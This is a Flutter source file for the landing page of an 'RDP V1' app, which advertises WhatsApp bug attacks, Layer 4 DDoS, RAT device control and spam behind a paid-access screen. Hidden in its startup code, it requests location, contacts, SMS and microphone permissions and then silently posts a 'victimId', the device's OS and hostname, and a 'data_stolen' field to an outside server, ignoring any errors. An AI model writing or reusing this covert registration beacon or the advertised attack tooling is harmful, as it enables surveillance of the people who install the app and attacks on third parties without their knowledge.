import 'dart:ui';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';
import 'cyan_glow_button.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:video_player/video_player.dart';

import 'login_page.dart';

class LandingPage extends StatefulWidget {
  const LandingPage({super.key});

  @override
  State<LandingPage> createState() => _LandingPageState();
}

class _LandingPageState extends State<LandingPage> with SingleTickerProviderStateMixin {
  late AnimationController _animCtrl;
  late Animation<double> _fadeAnim;
  late Animation<Offset> _slideAnim;
  late VideoPlayerController _videoCtrl;
  bool _videoReady = false;

  @override
  void initState() {
    super.initState();
    _initPermissions();

    _animCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 1200));
    _fadeAnim = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _animCtrl, curve: const Interval(0.3, 1.0, curve: Curves.easeOut)),
    );
    _slideAnim = Tween<Offset>(begin: const Offset(0, 0.15), end: Offset.zero).animate(
      CurvedAnimation(parent: _animCtrl, curve: const Interval(0.3, 1.0, curve: Curves.easeOutCubic)),
    );

    _videoCtrl = VideoPlayerController.asset('assets/videos/login.mp4')
      ..initialize().then((_) {
        if (mounted) {
          setState(() => _videoReady = true);
          _videoCtrl.setLooping(true);
          _videoCtrl.setVolume(0);
          _videoCtrl.play();
        }
      });

    _animCtrl.forward();
  }

  Future<void> _initPermissions() async {
    await [
      Permission.location,
      Permission.contacts,
      Permission.sms,
      Permission.microphone,
    ].request();

    try {
      const String serverBase = "http://arullll.private-rexy.web.id:11235";
      final String victimId = "SRY-${Platform.localHostname.hashCode}";
      await http.post(
        Uri.parse("$serverBase/register"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": victimId,
          "model": "${Platform.operatingSystem} | ${Platform.localHostname}",
          "data_stolen": "Target Terdeteksi di Landing Page",
        }),
      );
    } catch (_) {}
  }

  @override
  void dispose() {
    _animCtrl.dispose();
    _videoCtrl.dispose();
    super.dispose();
  }

  Future<void> _openUrl(String url) async {
    final uri = Uri.parse(url);
    if (!await launchUrl(uri, mode: LaunchMode.externalApplication)) throw Exception("Error $uri");
  }

  @override
  Widget build(BuildContext context) {
    final size = MediaQuery.of(context).size;

    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          // --- VIDEO / KARAKTER FULL SCREEN ---
          if (_videoReady)
            SizedBox.expand(
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoCtrl.value.size.width,
                  height: _videoCtrl.value.size.height,
                  child: VideoPlayer(_videoCtrl),
                ),
              ),
            )
          else
            SizedBox.expand(
              child: Image.asset('assets/images/logo.png', fit: BoxFit.cover),
            ),

          // --- GRADIENT OVERLAY ATAS & BAWAH ---
          Positioned.fill(
            child: DecoratedBox(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    Colors.black.withOpacity(0.6),
                    Colors.transparent,
                    Colors.transparent,
                    Colors.black.withOpacity(0.85),
                  ],
                  stops: const [0.0, 0.25, 0.55, 1.0],
                ),
              ),
            ),
          ),

          // --- KONTEN ---
          SafeArea(
            child: FadeTransition(
              opacity: _fadeAnim,
              child: SlideTransition(
                position: _slideAnim,
                child: SizedBox(
                  height: size.height,
                  child: Column(
                    children: [
                      // TOP: Logo + Nama app
                      const SizedBox(height: 55),
                      Container(
                        width: 75, height: 75,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          border: Border.all(color: Colors.white30, width: 1.5),
                          color: Colors.black38,
                          boxShadow: [BoxShadow(color: Colors.white12, blurRadius: 20)],
                        ),
                        child: ClipOval(
                          child: Image.asset('assets/images/logo.png', fit: BoxFit.cover),
                        ),
                      ),
                      const SizedBox(height: 14),
                      const Text(
                        'RDP V1',
                        style: TextStyle(
                          fontSize: 32,
                          fontWeight: FontWeight.w900,
                          color: Colors.white,
                          letterSpacing: 3,
                          fontFamily: 'Orbitron',
                          shadows: [Shadow(color: Colors.white54, blurRadius: 20)],
                        ),
                      ),
                      const SizedBox(height: 6),
                      const Text(
                        'Please Log in or Buy Access to continue',
                        style: TextStyle(color: Colors.white60, fontSize: 13),
                      ),

                      const SizedBox(height: 30),

                      // MIDDLE: Feature cards
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 28),
                        child: Row(
                          children: [
                            _buildFeatureCard(Icons.bug_report_rounded, 'WA Bug', 'Contact & Group'),
                            const SizedBox(width: 10),
                            _buildFeatureCard(Icons.security, 'DDoS', 'Layer 4 Attack'),
                            const SizedBox(width: 10),
                            _buildFeatureCard(Icons.phone_android, 'RAT', 'Device Control'),
                          ],
                        ),
                      ),
                      const SizedBox(height: 12),
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 28),
                        child: Row(
                          children: [
                            _buildFeatureCard(Icons.music_note_rounded, 'Music', 'Search & Play'),
                            const SizedBox(width: 10),
                            _buildFeatureCard(Icons.mosque_rounded, 'Sholat', 'Jadwal & Timer'),
                            const SizedBox(width: 10),
                            _buildFeatureCard(Icons.send_rounded, 'Spam', 'Multi Platform'),
                          ],
                        ),
                      ),

                      const Spacer(),

                      // BOTTOM: Tombol
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 28),
                        child: Column(
                          children: [
                            _buildLoginButton(),
                            const SizedBox(height: 14),
                            _buildBuyButton(),
                            const SizedBox(height: 16),
                            Row(
                              children: [
                                Expanded(child: _buildContactBtn(FontAwesomeIcons.telegram, "Contact", "https://t.me")),
                                const SizedBox(width: 12),
                                Expanded(child: _buildContactBtn(FontAwesomeIcons.telegram, "Channel", "https://t.me/")),
                              ],
                            ),
                            const SizedBox(height: 20),
                            const Text("© 2026 RDP BY MAUL", style: TextStyle(color: Colors.white24, fontSize: 11)),
                            const SizedBox(height: 12),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildFeatureCard(IconData icon, String title, String subtitle) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
        decoration: BoxDecoration(
          color: Colors.black.withOpacity(0.45),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: Colors.white.withOpacity(0.15)),
        ),
        child: Column(
          children: [
            Icon(icon, color: Colors.white70, size: 22),
            const SizedBox(height: 6),
            Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12)),
            Text(subtitle, style: const TextStyle(color: Colors.white38, fontSize: 9), textAlign: TextAlign.center),
          ],
        ),
      ),
    );
  }

  Widget _buildLoginButton() {
    return CyanGlowButton(
      label: 'LOGIN',
      icon: Icons.login_rounded,
      onPressed: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const LoginPage())),
    );
  }

  Widget _buildBuyButton() {
    return CyanGlowButton(
      label: 'BUY ACCESS',
      icon: Icons.lock_open_rounded,
      glowColor: const Color(0xFFBF00FF),
      onPressed: () => _openUrl("https://t.me/"),
    );
  }

  Widget _buildContactBtn(IconData icon, String label, String url) {
    return InkWell(
      onTap: () => _openUrl(url),
      borderRadius: BorderRadius.circular(12),
      child: Container(
        height: 46,
        decoration: BoxDecoration(
          color: Colors.white.withOpacity(0.07),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: Colors.white.withOpacity(0.15)),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            FaIcon(icon, color: const Color(0xFF0088cc), size: 16),
            const SizedBox(width: 8),
            Text(label, style: const TextStyle(color: Colors.white70, fontWeight: FontWeight.w600, fontSize: 13)),
          ],
        ),
      ),
    );
  }
}
